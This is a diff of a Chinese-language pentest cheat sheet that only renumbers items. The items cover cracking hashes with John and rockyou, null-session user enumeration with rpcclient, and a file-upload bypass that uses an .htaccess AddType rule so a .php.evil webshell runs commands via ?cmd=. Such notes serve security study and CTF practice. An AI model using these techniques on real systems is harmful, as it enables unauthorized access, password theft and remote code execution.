@@ -332,14 +332,14 @@ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
 # 将获取到的hash使用John破解
 ```
 
-13. **rpcclient工具**
+15. **rpcclient工具**
 
 ```bash
 rpcclient -W '' -c querydispinfo -U''%'' '192.168.120.181'  # 列举域内的用户名，`reminder`是密码
 rpcclient -U '' -N IP # 空账号密码访问
 ```
 
-14. **文件上传绕过**
+16. **文件上传绕过**
 ```bash
 vim .htaccess
 AddType application/x-httpd-php .evil
@@ -349,16 +349,16 @@ vim shell.php.evil
 # 接下来就是访问shell.php.evil?cmd=whoami，如果有反应则反弹成功
 ```
 
-15. **ILSpy工具**
+17. **ILSpy工具**
 ```bash
 # 一款逆向工具，可以寻找源码中的信息
 cd ~/Desktop/windowstool/artifacts/linux-x64
 ./ILSpy #后将文件导入
 ```
 
-16. `awk -F'[[:space:]]+' '{print $5}' user.txt>user.list`使用awk提取第五列
+18. `awk -F'[[:space:]]+' '{print $5}' user.txt>user.list`使用awk提取第五列
 
-17. **John工具**
+19. **John工具**
 ```bash
 john 1.txt # 获取加密方法
 # Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])从这一行看出是“krb5asrep”
